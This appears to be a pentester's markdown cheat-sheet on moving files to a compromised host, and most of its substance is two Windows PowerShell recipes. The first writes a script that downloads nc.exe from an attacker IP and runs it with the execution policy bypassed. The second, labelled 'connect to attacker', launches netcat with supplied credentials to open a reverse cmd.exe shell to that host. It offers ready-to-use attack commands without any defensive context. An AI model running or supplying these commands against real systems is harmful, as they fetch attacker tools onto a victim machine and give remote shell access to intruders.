# File transfert



## Server

### Python



## Client Unix


wget, fetch, ftp, tftp



## Client windows

### http

````
echo $storageDir = $pwd > upload.ps1
echo $url = "http://192.168.168.169/nc.exe" >> upload.ps1
echo $file = "$storageDir\nc.exe" >> upload.ps1
echo (New-Object System.Net.WebClient).DownloadFile($url,$file) >> upload.ps1
powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -File upload.ps1
````

Run reverse netcat connection and connect to attacker:
````
echo $secpasswd = ConvertTo-SecureString "myPassword1" -AsPlainText -Force >script.ps1
echo $mycreds = New-Object System.Management.Automation.PSCredential ("admin", $secpasswd) >>  script.ps1
echo $computer = "User-PC" >> script.ps1
echo [System.Diagnostics.Process]::Start("C:\tmp\nc.exe","192.168.168.169 443 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer) >> script.ps1
powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -File script.ps1
````








